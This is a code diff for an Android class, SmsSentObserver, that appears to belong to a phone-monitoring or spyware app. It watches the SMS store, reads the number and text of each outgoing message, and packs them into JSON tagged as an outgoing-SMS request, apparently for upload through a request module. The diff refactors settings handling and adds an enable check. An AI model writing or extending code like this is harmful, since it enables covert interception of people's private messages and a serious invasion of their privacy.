@@ -5,33 +5,34 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 import android.content.Context;
-import android.content.SharedPreferences;
 import android.database.ContentObserver;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Handler;
-import android.preference.PreferenceManager;
 
-import com.inet.android.bs.RequestMakerImpl;
+import com.inet.android.request.ConstantValue;
 import com.inet.android.request.DataRequest;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
+import com.inet.android.utils.ValueWork;
 
+/**
+ * SmsSentObserver class is design for monitoring outgoing sms
+ * 
+ * @author johny homicide
+ * 
+ */
 public class SmsSentObserver extends ContentObserver {
 
 	private static final String TAG = "SMSTSentObserver";
 	private static final Uri STATUS_URI = Uri.parse("content://sms");
-	String dir = null;
-	SharedPreferences sp;
 	private Context mContext;
-	RequestMakerImpl req;
 	private static long id = 0;
-	Handler handler;
-	
+	private Handler handler;
+
 	public SmsSentObserver(Handler handler, Context ctx) {
 		super(handler);
 		mContext = ctx;
-		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
 	}
 
 	public SmsSentObserver(Handler handler) {
@@ -40,19 +41,20 @@ public class SmsSentObserver extends ContentObserver {
 		this.handler = handler;
 	}
 
+	public void setContext(Context context) {
+		this.mContext = context;
+	}
+
 	public boolean deliverSelfNotifications() {
 		return true;
 	}
 
 	public void onChange(boolean selfChange) {
-		dir = "6";
-		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
-
 		try {
-			ConvertDate date = new ConvertDate();
 			Logging.doLog(TAG, "Notification on SMS observer",
 					"Notification on SMS observer");
-
+			if (ValueWork.getState(ConstantValue.TYPE_INCOMING_SMS_REQUEST, mContext) == 0)
+				return;
 			Cursor sms_sent_cursor = mContext.getContentResolver().query(
 					STATUS_URI, null, null, null, null);
 			if (sms_sent_cursor != null) {
@@ -93,6 +95,7 @@ public class SmsSentObserver extends ContentObserver {
 								String message = sms_sent_cursor
 										.getString(sms_sent_cursor
 												.getColumnIndex("body"));
+
 								// -------send sms----------------------------
 								String sendJSONStr = null;
 								JSONObject jsonObject = new JSONObject();
@@ -104,8 +107,10 @@ public class SmsSentObserver extends ContentObserver {
 									info.put("number", phNumber);
 									info.put("data", message);
 
-									object.put("time", date.logTime());
-									object.put("type", dir);
+									object.put("time", ConvertDate.logTime());
+									object.put(
+											"type",
+											ConstantValue.TYPE_OUTGOING_SMS_REQUEST);
 									object.put("info", info);
 									data.put(object);
 									jsonObject.put("data", data);
